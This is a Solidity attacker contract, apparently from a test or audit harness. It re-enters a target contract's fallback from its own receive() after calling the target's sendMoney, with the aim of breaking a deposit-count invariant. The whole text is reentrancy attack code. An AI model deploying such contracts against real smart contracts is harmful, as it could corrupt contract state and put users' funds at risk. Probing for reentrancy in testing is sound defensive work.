contract ReentrantAttacker {
    C public target;
    uint256 private amountToSend;
    bool private reentered;

    constructor(C _target) {
        target = _target;
    }

    function attack(uint256 amount) external payable {
        amountToSend = amount;
        reentered = false;
        target.sendMoney{value: 0}(address(this), amount);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Trigger fallback which increments depositsCount
            (bool ok, ) = address(target).call{value: amountToSend}("");
            // If the call fails (e.g., transfer reverts due to insufficient gas),
            // the fallback's increment is rolled back, but the invariant
            // may be broken depending on the execution path.
        }
    }
}
